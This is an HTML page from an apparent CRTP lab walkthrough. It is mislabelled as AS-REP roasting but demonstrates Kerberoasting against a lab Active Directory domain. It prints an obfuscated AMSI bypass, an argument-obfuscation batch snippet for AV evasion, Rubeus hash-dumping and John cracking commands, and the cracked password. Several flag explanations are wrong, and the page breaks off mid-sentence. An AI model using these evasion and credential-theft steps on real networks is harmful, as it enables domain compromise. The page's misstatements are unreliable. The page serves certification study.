@@ -1,0 +1,341 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>AS-REP Roasting - CRTP</title>
+  <link rel="shortcut icon" href="../assets/images/logo.ico" type="image/x-icon">
+  <link rel="stylesheet" href="../assets/css/style.css">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
+  <style>
+    .project-sidebar { padding: 20px; }
+    .project-sidebar h3 { color: #ffdb70; margin-bottom: 15px; font-size: 1.1rem; }
+    .project-sidebar .portfolio-link { 
+      display: block; 
+      padding: 10px 12px; 
+      margin-bottom: 15px; 
+      color: #ffdb70; 
+      text-decoration: none; 
+      border-radius: 6px; 
+      font-size: 0.9rem; 
+      font-weight: 600;
+      background: #2a2a2a;
+      transition: all 0.2s;
+    }
+    .project-sidebar .portfolio-link:hover { 
+      background: #ffdb70; 
+      color: #1a1a1a; 
+    }
+    .project-sidebar a { 
+      display: block; 
+      padding: 8px 12px; 
+      margin: 4px 0; 
+      color: #d6d6d6; 
+      text-decoration: none; 
+      border-radius: 6px; 
+      font-size: 0.9rem; 
+      transition: all 0.2s; 
+    }
+    .project-sidebar a:hover { 
+      background: #2a2a2a; 
+      color: #ffdb70; 
+    }
+    .project-sidebar a.active { 
+      background: #ffdb70; 
+      color: #1a1a1a; 
+      font-weight: 600; 
+    }
+    
+    .notion-content { 
+      line-height: 1.6; 
+    }
+    .notion-content img { 
+      max-width: 100%; 
+      height: auto; 
+      margin: 20px 0; 
+      border-radius: 8px; 
+      box-shadow: 0 4px 8px rgba(0,0,0,0.3);
+    }
+    .notion-content h1 { 
+      font-size: 1.8rem; 
+      margin: 30px 0 20px; 
+      color: #fafafa; 
+    }
+    .notion-content h2 { 
+      font-size: 1.5rem; 
+      margin: 25px 0 15px; 
+      color: #fafafa; 
+    }
+    .notion-content h3 { 
+      font-size: 1.3rem; 
+      margin: 20px 0 10px; 
+      color: #fafafa; 
+    }
+    .notion-content p { 
+      margin: 15px 0; 
+      color: #d6d6d6; 
+    }
+    .notion-content ul, .notion-content ol { 
+      margin: 15px 0; 
+      padding-left: 30px; 
+    }
+    .notion-content li { 
+      margin: 5px 0; 
+      color: #d6d6d6; 
+    }
+    .notion-content code { 
+      background: #2a2a2a; 
+      padding: 2px 6px; 
+      border-radius: 4px; 
+      font-family: 'Courier New', monospace; 
+      color: #ffdb70; 
+    }
+    .notion-content pre { 
+      background: #1e1e1e; 
+      border-left: 4px solid #ffdb70; 
+      padding: 15px; 
+      margin: 20px 0; 
+      border-radius: 0 8px 8px 0; 
+      overflow-x: auto; 
+    }
+    .notion-content a { 
+      color: #ffdb70; 
+      text-decoration: underline; 
+    }
+    .notion-content strong { 
+      color: #fafafa; 
+      font-weight: 600; 
+    }
+    .notion-content em { 
+      font-style: italic; 
+    }
+    .notion-content figure { 
+      margin: 20px 0; 
+    }
+    .notion-content figcaption { 
+      display: none; 
+    }
+    .main-content { 
+      max-width: 100% !important; 
+    }
+    .about { 
+      max-width: 100% !important; 
+      padding: 20px 40px !important; 
+    }
+    /* Critical: Code Block Formatting */
+    pre code {
+      white-space: pre;
+      word-break: normal;
+      overflow-x: auto;
+      display: block;
+      font-family: 'Courier New', monospace;
+      font-size: 0.9rem;
+      line-height: 1.5;
+    }
+  </style>
+</head>
+<body>
+  <main>
+    <aside class="sidebar" data-sidebar>
+      <div class="sidebar-info">
+        <figure class="avatar-box">
+          <img src="../assets/images/my-avatar.png?v=3" alt="Mr Stark" width="80">
+        </figure>
+        <div class="info-content">
+          <h1 class="name" title="Mr Stark">Mr Stark</h1>
+          <p class="title">CRTP Walkthrough</p>
+        </div>
+        <button class="info_more-btn" data-sidebar-btn>
+          <span>Show Navigation</span>
+          <ion-icon name="chevron-down"></ion-icon>
+        </button>
+      </div>
+      <div class="sidebar-info_more">
+        <div class="separator"></div>
+        <div class="project-sidebar">
+          <a href="../" class="portfolio-link">← Portfolio</a>
+          <h3>Sections</h3>
+           <a href="part-01.html">1. PowerShell Detection & Bypass</a>
+           <a href="part-02.html">2. Enumeration Tools</a>
+           <a href="part-03.html">3. Domain Enumeration Techniques</a>
+           <a href="part-04.html">4. Privilege Escalation (Derivative Local Admin)</a>
+           <a href="part-05.html">5. Golden Ticket</a>
+           <a href="part-06.html">6. Silver Ticket & WMI Abuse</a>
+           <a href="part-07.html">7. Diamond Ticket</a>
+           <a href="part-08.html">8. DCSync Attack</a>
+           <a href="part-09.html">9. AS-REP Roasting</a>
+           <a href="part-10.html">10. Unconstrained Delegation + Printer Bug</a>
+           <a href="part-11.html">11. Constrained Delegation</a>
+           <a href="part-12.html">12. Resource-Based Constrained Delegation (RBCD)</a>
+           <a href="part-13.html">13. Trust Enumeration & Abuse</a>
+           <a href="part-14.html">14. Cross-Forest Trust Attacks</a>
+           <a href="part-15.html">15. ADCS Attacks (ESC1, ESC3)</a>
+           <a href="part-16.html">16. Tools Transfer & Execution</a>
+           <a href="part-17.html">17. ASR Rules Bypass (Lateral Movement)</a>
+        </div>
+      </div>
+    </aside>
+
+    <div class="main-content">
+      <article class="about active" data-page="about">
+        <header class="h2 article-title">AS-REP Roasting</header>
+        <section class="about-text notion-content">
+          <h1>AS-REPRoasting Attack Targeting Domain Accounts With SNP Set with Rubeus.</h1></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8046-a8f7-ffb177b8cae4" class="">In this demonstration we will be targeting Domain Accounts with Service Principal Name set only. <br/>We start by enumerating services running with user accounts as the services running with machine accounts have difficult passwords. <br/>We can use PowerView’s (Get-DomainUser -SPN) or ActiveDirectory module for discovering such services.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8099-ad03-dc49176fb83d" class="">Let’s just use PowerView module for that enumeration, by importing it to the target.</p></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80b8-a091-cc5528b79403" class="">The steps reproduced here will also include AV bypassing, but if no AV is being used in the environment then you can skip that and go forward to the enumeration.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8006-bac7-e4c676fd906f" class="">Start by running InvisiShell then we can bypass AMSI.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8082-8841-c89c68512f9b" class=""><code>RunWithRegistryNonAdmin.bat</code></p></div><div style="display:contents" dir="ltr"><figure id="30c79e9a-d7c9-80b7-9845-e264c3553c68" class="image"><a href="images/screenshot_156.png"><img style="width:1441.9666748046875px" src="images/screenshot_156.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80e4-bbc7-e14c02e3674d" class="">AMSI Bypass.</p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="30c79e9a-d7c9-8072-88a7-f2885a537d87" class="code code-wrap"><code class="language-bash">S`eT-It`em ( &#x27;V&#x27;+&#x27;aR&#x27; + &#x27;IA&#x27; + (&#x27;blE:1&#x27;+&#x27;q2&#x27;) + (&#x27;uZ&#x27;+&#x27;x&#x27;) ) ([TYpE]( &quot;{1}{0}&quot;-F&#x27;F&#x27;,&#x27;rE&#x27; ) ) ; ( Get-varI`A`BLE ((&#x27;1Q&#x27;+&#x27;2U&#x27;) +&#x27;zX&#x27; ) -VaL ).&quot;A`ss`Embly&quot;.&quot;GET`TY`Pe&quot;((&quot;{6}{3}{1}{4}{2}{0}{5}&quot; -f(&#x27;Uti&#x27;+&#x27;l&#x27;),&#x27;A&#x27;,(&#x27;Am&#x27;+&#x27;si&#x27;),(&#x27;.Man&#x27;+&#x27;age&#x27;+&#x27;men&#x27;+&#x27;t.&#x27;),(&#x27;u&#x27;+&#x27;to&#x27;+&#x27;mation.&#x27;),&#x27;s&#x27;,(&#x27;Syst&#x27;+&#x27;em&#x27;) ) ).&quot;g`etf`iElD&quot;( ( &quot;{0}{2}{1}&quot; -f(&#x27;a&#x27;+&#x27;msi&#x27;),&#x27;d&#x27;,(&#x27;I&#x27;+&#x27;nitF&#x27;+&#x27;aile&#x27;) ),( &quot;{2}{4}{0}{1}{3}&quot; -f(&#x27;S&#x27;+&#x27;tat&#x27;),&#x27;i&#x27;,(&#x27;Non&#x27;+&#x27;Publ&#x27;+&#x27;i&#x27;),&#x27;c&#x27;,&#x27;c,&#x27; )).&quot;sE`T`VaLUE&quot;(${n`ULl},${t`RuE} )</code></pre></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-803c-a585-e77a41e11ed8" class="">Now let’s import PowerView module and start the enumeration.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8054-aad0-cf75106a7622" class=""><code>. .\PowerView.ps1</code></p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80c3-a5f2-fb3f4aec2dd3" class=""><code>Gelt-DomainUser -SPN</code></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="30c79e9a-d7c9-80db-8bc3-c312bec86077" class="code code-wrap"><code class="language-bash">pwdlastset                    : 11/11/2022 9:59:41 PM
+logoncount                    : 0
+badpasswordtime               : 12/31/1600 4:00:00 PM
+description                   : Key Distribution Center Service Account
+distinguishedname             : CN=krbtgt,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
+objectclass                   : {top, person, organizationalPerson, user}
+showinadvancedviewonly        : True
+samaccountname                : krbtgt
+admincount                    : 1
+codepage                      : 0
+samaccounttype                : USER_OBJECT
+accountexpires                : NEVER
+countrycode                   : 0
+whenchanged                   : 11/12/2022 6:14:52 AM
+instancetype                  : 4
+useraccountcontrol            : ACCOUNTDISABLE, NORMAL_ACCOUNT
+objectguid                    : 956ae091-be8d-49da-966b-0daa8d291bb2
+lastlogoff                    : 12/31/1600 4:00:00 PM
+whencreated                   : 11/12/2022 5:59:41 AM
+objectcategory                : CN=Person,CN=Schema,CN=Configuration,DC=moneycorp,DC=local
+dscorepropagationdata         : {11/12/2022 6:14:52 AM, 11/12/2022 5:59:41 AM, 1/1/1601 12:04:16 AM}
+serviceprincipalname          : kadmin/changepw
+usncreated                    : 12300
+usnchanged                    : 12957
+memberof                      : CN=Denied RODC Password Replication Group,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
+lastlogon                     : 12/31/1600 4:00:00 PM
+badpwdcount                   : 0
+cn                            : krbtgt
+msds-supportedencryptiontypes : 0
+objectsid                     : S-1-5-21-719815819-3726368948-3917688648-502
+primarygroupid                : 513
+iscriticalsystemobject        : True
+name                          : krbtgt
+
+logoncount               : 4
+badpasswordtime          : 12/31/1600 4:00:00 PM
+distinguishedname        : CN=web svc,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
+objectclass              : {top, person, organizationalPerson, user}
+displayname              : web svc
+lastlogontimestamp       : 1/1/2024 4:49:03 AM
+userprincipalname        : websvc
+whencreated              : 11/14/2022 12:42:13 PM
+samaccountname           : websvc
+codepage                 : 0
+samaccounttype           : USER_OBJECT
+accountexpires           : NEVER
+countrycode              : 0
+whenchanged              : 1/1/2024 12:49:03 PM
+instancetype             : 4
+usncreated               : 38071
+objectguid               : b7ab147c-f929-4ad2-82c9-7e1b656492fe
+sn                       : svc
+lastlogoff               : 12/31/1600 4:00:00 PM
+msds-allowedtodelegateto : {CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL, CIFS/dcorp-mssql}
+objectcategory           : CN=Person,CN=Schema,CN=Configuration,DC=moneycorp,DC=local
+dscorepropagationdata    : {11/14/2022 12:42:13 PM, 1/1/1601 12:00:00 AM}
+serviceprincipalname     : {SNMP/ufc-adminsrv.dollarcorp.moneycorp.LOCAL, SNMP/ufc-adminsrv}
+givenname                : web
+usnchanged               : 172156
+lastlogon                : 1/10/2024 1:05:40 AM
+badpwdcount              : 0
+cn                       : web svc
+useraccountcontrol       : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, TRUSTED_TO_AUTH_FOR_DELEGATION
+objectsid                : S-1-5-21-719815819-3726368948-3917688648-1114
+primarygroupid           : 513
+pwdlastset               : 11/14/2022 4:42:13 AM
+name                     : web svc
+
+logoncount            : 35
+badpasswordtime       : 11/25/2022 4:20:42 AM
+description           : Account to be used for services which need high privileges.
+distinguishedname     : CN=svc admin,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
+objectclass           : {top, person, organizationalPerson, user}
+displayname           : svc admin
+lastlogontimestamp    : 1/1/2024 4:49:39 AM
+userprincipalname     : svcadmin
+samaccountname        : svcadmin
+admincount            : 1
+codepage              : 0
+samaccounttype        : USER_OBJECT
+accountexpires        : NEVER
+countrycode           : 0
+whenchanged           : 1/1/2024 12:49:39 PM
+instancetype          : 4
+usncreated            : 40118
+objectguid            : 244f9c84-7e33-4ed6-aca1-3328d0802db0
+sn                    : admin
+lastlogoff            : 12/31/1600 4:00:00 PM
+whencreated           : 11/14/2022 5:06:37 PM
+objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=moneycorp,DC=local
+dscorepropagationdata : {11/14/2022 5:15:01 PM, 11/14/2022 5:06:37 PM, 1/1/1601 12:00:00 AM}
+serviceprincipalname  : {MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local:1433,
+                        MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local}
+givenname             : svc
+usnchanged            : 172187
+memberof              : CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
+lastlogon             : 1/10/2024 3:22:26 AM
+badpwdcount           : 0
+cn                    : svc admin
+useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
+objectsid             : S-1-5-21-719815819-3726368948-3917688648-1118
+primarygroupid        : 513
+pwdlastset            : 11/14/2022 9:06:37 AM
+name                  : svc admin
+
+</code></pre></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80a3-ba2a-e8e431f28de0" class="">The output from our Service Principle Name query, shows us all the domain accounts that are used as Service Accounts.<br/>We should focus on 2 properties here in the output, which are: samaccountname  and serviceprincipalname</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8025-8c7b-ceb15bf1d869" class="">Base on these 2 properties we are able to determine if the account is a service account or not.<br/>From the request output we can see that we do have several accounts as Service Account, but we will targeting SVCADMIN service account.<br/><code><strong>SVCADMIN</strong></code> is a domain Administrator account and has a SPN set that’s a great target.</p></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-801a-9410-ddcee44dbc15" class="">We can use Rubeus to get hashes for the svcadmin account. Note that we are using the /rc4opsec option that gets hashes only for the accounts that support RC4. This means that if &#x27;This account supports Kerberos AES 128/256 bit encryption&#x27; is set for a service account, the below command will not request its hashes.</p></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"><h3 id="30c79e9a-d7c9-8085-aa64-f6536008bcf2" class="">Using PELoader.exe for args encoding.</h3></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-800a-95c6-f9ea6a181267" class="">Back to cmdlet, <code>PELoader.exe</code> is a tool used to load a payload into memory. So I’ll use PELoader.exe now to load and execute Rubeus.exe into memory. Pay attention that if we are using PELoader.exe to load payloads into memory only. It is also good that we execute <strong>ArgSplit.bat</strong> first to encode parameters of Rubeus, SafetyKatz and BetterSafetyKatz.</p></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8022-8806-dc1b7ec2b669" class="">Execute argSplit.exe and type:<br/><code>kerberoast</code></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="30c79e9a-d7c9-8094-beff-da11afbcf1d0" class="code code-wrap"><code class="language-bash">set &quot;z=t&quot;
+set &quot;y=s&quot;
+set &quot;x=a&quot;
+set &quot;w=o&quot;
+set &quot;v=r&quot;
+set &quot;u=e&quot;
+set &quot;t=b&quot;
+set &quot;s=r&quot;
+set &quot;r=e&quot;
+set &quot;q=k&quot;
+set &quot;Pwn=%q%%r%%s%%t%%u%%v%%w%%x%%y%%z%&quot;</code></pre></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8088-aed5-c1ccb0e87e9d" class="">Now we can execute Rubeus.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-806d-ba26-c4a99251547d" class=""><code>C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:svcadmin /simple /rc4opsec /outfile:C:\AD\Tools\hashes.txt</code></p></div><div style="display:contents" dir="ltr"><figure id="30c79e9a-d7c9-8034-92e5-faa1fabfe6fb" class="image"><a href="images/screenshot_157.png"><img style="width:1441.9833984375px" src="images/screenshot_157.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80af-aeab-c0f4786a2fa6" class="">The command provided uses the <code>Loader.exe</code> tool to execute the <code>Rubeus.exe</code> tool with specific arguments. Here&#x27;s a breakdown of the flags used:</p></div><div style="display:contents" dir="auto"><ol type="1" id="30c79e9a-d7c9-808f-9afa-fa072b3210cb" class="numbered-list" start="1"><li><strong>path</strong>: This flag specifies the path to the executable file that will be run. In this case, it is <code>C:\\AD\\Tools\\Rubeus.exe</code>.</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="30c79e9a-d7c9-80e1-8766-c20daece8a99" class="numbered-list" start="2"><li><strong>args</strong>: This flag specifies the arguments to be passed to the executable file. The arguments are <code>%Pwn% /user:svcadmin /simple /rc4opsec /outfile:C:\\AD\\Tools\\hashes.txt</code>.<div style="display:contents" dir="auto"><ul id="30c79e9a-d7c9-802e-a8bb-ddbe2b830c91" class="bulleted-list"><li style="list-style-type:disc"><strong>%Pwn%</strong>: This is a placeholder for the password to be used. It should be replaced with the actual password.</li></ul></div><div style="display:contents" dir="auto"><ul id="30c79e9a-d7c9-8016-b20b-da9fa0542111" class="bulleted-list"><li style="list-style-type:disc"><strong>/user:svcadmin</strong>: This flag specifies the username to use for the operation. In this case, it is <code>svcadmin</code>.</li></ul></div><div style="display:contents" dir="auto"><ul id="30c79e9a-d7c9-802f-97e6-f1156f4380bd" class="bulleted-list"><li style="list-style-type:disc"><strong>/simple</strong>: This flag indicates that the tool should use simple authentication.</li></ul></div><div style="display:contents" dir="auto"><ul id="30c79e9a-d7c9-805c-86e0-c62414e38567" class="bulleted-list"><li style="list-style-type:disc"><strong>/rc4opsec</strong>: This flag specifies the encryption type to use. In this case, it is RC4.</li></ul></div><div style="display:contents" dir="auto"><ul id="30c79e9a-d7c9-80da-a789-e83e4379e048" class="bulleted-list"><li style="list-style-type:disc"><strong>/outfile:C:\AD\Tools\hashes.txt</strong>: This flag specifies the output file where the results will be saved. In this case, it is <code>C:\\AD\\Tools\\hashes.txt</code>.</li></ul></div></li></ol></div><div style="display:contents" dir="auto"><h3 id="30c79e9a-d7c9-804b-8017-e0c3eeda35ef" class="">Explanation of Rubeus Flags</h3></div><div style="display:contents" dir="auto"><ol type="1" id="30c79e9a-d7c9-8054-92c9-c5fcee0cf2b1" class="numbered-list" start="1"><li><strong>/user</strong>: This flag specifies the username to use for the operation.</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="30c79e9a-d7c9-802f-af01-e9f6666a3bfb" class="numbered-list" start="2"><li><strong>/simple</strong>: This flag indicates that the tool should use simple authentication.</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="30c79e9a-d7c9-80d3-bc0a-efd02fdb699f" class="numbered-list" start="3"><li><strong>/rc4opsec</strong>: This flag specifies the encryption type to use. In this case, it is RC4.</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="30c79e9a-d7c9-8032-b045-db956bb2038f" class="numbered-list" start="4"><li><strong>/outfile</strong>: This flag specifies the output file where the results will be saved.</li></ol></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-809e-b319-f41e7e9bfb48" class="">If we check the file hashes.txt file, we are able to see that we were able to request the hashes for svcadmin service account hash.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80e9-9d29-c10295765a4e" class=""><code>type hash.txt</code></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="30c79e9a-d7c9-80aa-9a5f-f02e7c6458a5" class="code code-wrap"><code class="language-bash">$krb5tgs$23$*svcadmin$DOLLARCORP.MONEYCORP.LOCAL$MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local:1433*$65F5F15B51FC2784C75C6C0A532EBCDB$05B5B57B25D8E119674CF62D2C2BFBD7BBD0993D0FE3D26E23CBAC5F416370E265425C1539E7FD8F7749F6980E893BC018D8A16C2E117F75F73889B7AEB1E93B25DD5473BDEE45B2D78BD9977C8CC93EB1C77DA78EAD6705BE661BFCB471A48AFBA6EBB381CA2F313408B54AB7AC6B974E4C4BD361D973864C9219D3D190A7CED0C93222417D7F5FF9315C58A0863A1696BD09E51A315C71B3D672AE7DD9DB68C5B31CFD4FD05F46C59591B80ECC12985E40071C3BAD11CC3B562B715B52AD2F0DE12ED768CCA4BED0C1FE430FCD4E387051DDEC302D2F1739641BE7EBFEDCFA3AE5CCD77587E3B2145EF181C2697FDD1068B3C09011CCBAF4E7CAB8496A60B85E8AB78DE44B844673729D13456E54BBC56D27413DAC7FD2F939DF91AE4D21AA155867515E38DFF655CC8A223E9995FB390F8D7EB66F82F539AE041B33F339DC79271EB127BE15AF9DE014DA12773D6D117C429429D538C46D1FB5D4A6C134F87AE3C3D25603A12978AA71BC5CA5991901DC67AB837D946DCBEB5EC7239D19CCF9E1BBC909C6034D0B34CF861C25D79A0D567AC8B5921EE5DA72DF19B9576DEFC600E36DEB61DDD50BAF1AF3D416941D8B8A279FB6AF139E0D9928BDD09B58938B6FD2782FB0BA423291BA6DC8F0F0B77A034091EEC1A644B7408A55479267F7C30ACE59CCD11976B0CC9A3B8C54D5E4CFB4BB60A8EBB42528499B7DE6934CA9A6038D7F821EBCEFA99E12DCFDC36BEAE6FD9AB6DBC61BE019858B4A5B79900A917268E23947D83DA19A43B5D6C2F3507DAEFE4673EC80CBBDB72016970BA3B95444CC6F94E0557A079A3CF2CA884D8F79EEFA9E4267AA4E226EDDBD50AF89DDDB93AE60A2D8FA6B72C6CABB891FAEB927759635B9656B4DBEC78A34F3C09725781E6A7D5CA3EE411853863FD925BDA31E9E6775900C52200AF3B7F8ECDFC2C70B6BCFC01D19E84FA31717A864562E561383647367FF3930DA7A5C9C7063701EEF47E823CE28C148799D76E3B202586BD500EF97F9B0BB669D08341EE76B62746CA33953B19A5CB64CA7A4D5E2872CCB4CE75DA8906581370E04444B81736D36F6360A128C9F4654CBFBB16831B1E01C33C1A9D7CB6649D1A373C7CE079561BE628A6DAFCDE81C0BB7BCB433CCB289F365CF074384A3800862A93F70D5A9BE2221F108A7E0C5657B3125B398A2E7A538848E589230DF86516FEDE82FB8314536B3BC677E7AC9283F21FA30CA47E5F649DDD0EF29C9AFE08AF8477E166705283A61F903D6E873CE6A44B192FF8C926C33BB3612EF004299BBC1DBA5D387294A49D2FE1D2F75582FCADE1E89383DD5193F6F2A1D9319376386494DFE7507BEE1FD979DC97A5954ED974E7F0D19DDB2F6BA9B5EF7DC0A9EDA1CCDDB0644E749681CFAF51FE084DD62D6408E0AA0B9C0069AFF773A61BE872D95994E16C457FBF2F96392AB300762B84AFDC841B606203EE982D58FFFF365839FB81B3EB6BE1DBBFF384776B316686680DEA997E85700C1B50861B1C3CAECE964138C40AF72185401D6B6835F502014812D0934AD7C318BE5C82D485D98D48D47166AE401CECA2A9AD8D84C2DDAB01B8F9D52B05EC6596E9A44095F94B88A0C1CA45C018F83974F3D76DA5607F05988B70FD83CDAED50A2D388BE12F5A9F1630B0CA1C5D988</code></pre></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8067-8a74-cefab1f3aa95" class="">We can now use John the Ripper to brute-force the hashes. Please note that you need to remove &quot;<strong>:1433</strong>&quot; from the SPN in hashes.txt before running John or hashcat.</p></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80ad-b9c9-c4d51102edda" class="">Let’s now use John and try to crack this Service Account hash.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80db-94c9-c166e019c527" class=""><code>C:\AD\Tools\john-1.9.0-jumbo-1-win64\run\john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt</code></p></div><div style="display:contents" dir="ltr"><figure id="30c79e9a-d7c9-80ac-80c3-e7035a62bcc5" class="image"><a href="images/screenshot_159.png"><img style="width:1441.9666748046875px" src="images/screenshot_159.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-804f-97dd-f4a1b0cc080f" class=""><code>*ThisisBlasphemyThisisMadness!!</code></p></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div></li></ul></div><div style="display:contents" dir="auto"><ul id="30c79e9a-d7c9-80c3-a855-f68c7564ca2c" class="bulleted-list"><li><strong>Unconstrained Delegation</strong><div style="display:contents" dir="auto"><h3 id="30c79e9a-d7c9-8018-80d3-f3e0ed67f54c" class="">Unconstrained Delegation</h3></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80f6-8da0-d7455758b7e0" class="">Unconstrained delegation is a powerful feature in Active Directory (AD) that allows a computer to impersonate any user or service in the domain without any restrictions. This feature is often used in multi-tiered web applications to allow front-end services to access back-end resources without requiring users to re-authenticate. However, it also poses significant security risks if not properly configured and monitored.</p></div><div style="display:contents" dir="auto"><h3 id="30c79e9a-d7c9-80ff-a89f-d2b748436003" class="">How Unconstrained Delegation Works</h3></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8033-bb14-fa8d5aa28f0c" class="">When a user logs into a computer with unconstrained delegation enabled, the computer saves a copy of the user’s Ticket Granting Ticket (TGT) in memory. This TGT can then be used to impersonate the user and access any service or resource in the domain. If an attacker gains access to this TGT, they can use it to move laterally within the domain and gain access to sensitive information.</p></div><div style="display:contents" dir="auto"><h3 id="30c79e9a-d7c9-805c-9836-eaa7f6c766f2" class="">Risks Associated with Unconstrained Delegation</h3></div><div style="display:contents" dir="auto"><ol type="1" id="30c79e9a-d7c9-80db-8bbb-c8d44bf9afab" class="numbered-list" start="1"><li><strong>Lateral Movement</strong>: An attacker who gains access to a computer with unconstrained delegation enabled can move laterally within the domain, impersonating any user or service.</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="30c79e9a-d7c9-80a9-bc96-f127468be5e6" class="numbered-list" start="2"><li><strong>Domain Compromise</strong>: If an attacker gains access to a domain controller with unconstrained delegation enabled, they can compromise the entire domain.</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="30c79e9a-d7c9-80e9-9a2c-c50f0d5656ed" class="numbered-list" start="3"><li><strong>Golden Ticket Attacks</strong>: An attacker who gains access to a KRBTGT account with 